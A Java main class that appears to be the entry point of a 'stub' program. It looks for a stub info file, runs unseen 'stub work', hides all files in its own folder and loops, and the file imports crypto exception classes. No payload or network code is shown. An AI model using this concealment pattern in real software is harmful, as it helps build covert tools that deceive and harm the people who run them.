import javax.crypto.BadPaddingException;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import java.awt.*;
import java.io.*;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;

import static java.awt.SystemColor.info;

public class Main {

    public static void main(String[] args) throws Exception {
        //Debug
        debug.initDebug();
        //if (!aim.registerInstance()) {
            // instance already running.
            //System.out.println("Another instance of this application is already running. Exiting.");
            //System.exit(0);
        //}
        aim.setApplicationInstanceListener(new aim.ApplicationInstanceListener() {
            public void newInstanceCreated() {
                System.out.println("New instance detected...");
                // this is where your handler code goes...
            }
        });
        //Get file info first, etc
       core.returnAppPath();
       core.returnAppName();
        //Files in folders
       String jsiName = core.isStubInfoFile();
       if(jsiName == "null"){
           core.stubStatus = "Looking";
           debug.addLine("File isn't there!\n", Color.YELLOW, 12, false);
           core.startLoop();
        }else{
           core.stubStatus = "Setting up";
           debug.addLine("File is there! " + jsiName + "\n", Color.GREEN, 12, false);
           core.findSetAPPID(jsiName);
           core.setStubInfo(core.stubFile);
           core.getStubPaths(core.stubInfo);
           core.doRequiredStubWork(core.stubInfo);
           core.hideAllFilesINFolder(core.myAppPath);
           core.stubStatus = "Running";
           core.startLoop();
       }
    }
}
